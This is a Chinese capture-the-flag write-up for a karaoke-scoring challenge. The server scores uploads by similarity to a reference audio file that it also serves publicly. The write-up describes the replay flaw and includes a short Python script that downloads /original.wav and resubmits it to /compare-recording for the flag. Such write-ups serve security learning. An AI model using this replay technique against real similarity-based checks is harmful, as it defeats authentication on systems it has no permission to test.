# 麦霸评分

## 题目简述

题目提供一个在线演唱评分页面。浏览器把录音以 `multipart/form-data` 上传到 `POST /compare-recording`，服务端将录音与参考音频比较；相似度足够高时，JSON 响应会直接返回 flag。前端同时公开了参考音频 `/original.wav`，因此无需伪造嗓音，只要把服务端用于比对的原音频原样提交即可。

## 解题过程

### 确认接口与信任边界

在浏览器开发者工具的 Network 面板完成一次正常评分，可以看到请求方法为 `POST`、路径为 `/compare-recording`，文件字段名为 `audio`。官方题解的示例响应还给出了 `originalAudioUrl: "/original.wav"`，说明参考样本本身对客户端可读。

这使评分逻辑形成了直接的重放漏洞：服务端把公开文件当作真实性基准，却没有区分“用户现场录音”和“从本站下载的参考音频”。

### 下载并重放参考音频

下面的脚本先下载原音频，再按正常请求格式上传。`BASE` 应替换为题目实例地址，不在长期 WP 中保留临时容器地址。

```python
import io
import requests

BASE = "http://challenge.example"

audio = requests.get(f"{BASE}/original.wav", timeout=10)
audio.raise_for_status()

response = requests.post(
    f"{BASE}/compare-recording",
    files={"audio": ("original.wav", io.BytesIO(audio.content), "audio/wav")},
    timeout=30,
)
response.raise_for_status()
print(response.json())
```

官方记录中的重放响应为 `success: true`、相似度约 `99.09`，并在同一 JSON 中返回 flag。这同时验证了接口、字段名和重放思路。

## 方法总结

- 核心技巧：下载服务端公开的参考样本，并把它原样提交给相似度比较接口。
- 识别信号：前端资源或接口响应泄露 `originalAudioUrl`，而认证条件只依赖“与参考样本足够相似”。
- 复用要点：处理音频、图片或行为相似度题时，应先确认基准样本是否能被客户端下载；若能，优先测试精确重放，而不是先做复杂的生成或信号处理。
